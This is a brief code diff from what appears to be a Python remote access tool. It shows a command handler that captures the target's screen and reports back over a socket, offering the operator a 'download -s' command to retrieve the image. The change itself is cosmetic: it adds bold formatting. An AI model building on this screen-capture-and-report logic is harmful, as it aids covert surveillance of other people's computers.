@@ -61,8 +61,8 @@ def recieveCommands():
             try:
                 bitmap = autopy.bitmap.capture_screen()
                 bitmap.save(pathToScreenshot)
-                tookScreenShot = ('\n' + GREEN + '[*] Succesfuly took screenshot at ' + pathToScreenshot + END)
-                use = ('\n' + GREEN + "[*] Use 'download -s' to download screenshot" + END + '\n')
+                tookScreenShot = ('\n' + GREEN + BOLD + '[*] Succesfuly took screenshot at ' + pathToScreenshot + END)
+                use = ('\n' + GREEN + BOLD + "[*] Use 'download -s' to download screenshot" + END + '\n\n')
                 s.send(str.encode(tookScreenShot + use))
             except:
                 screenshotFailed = ('\n' + RED + "[!] Couldn't take screenshot " + END + '\n')
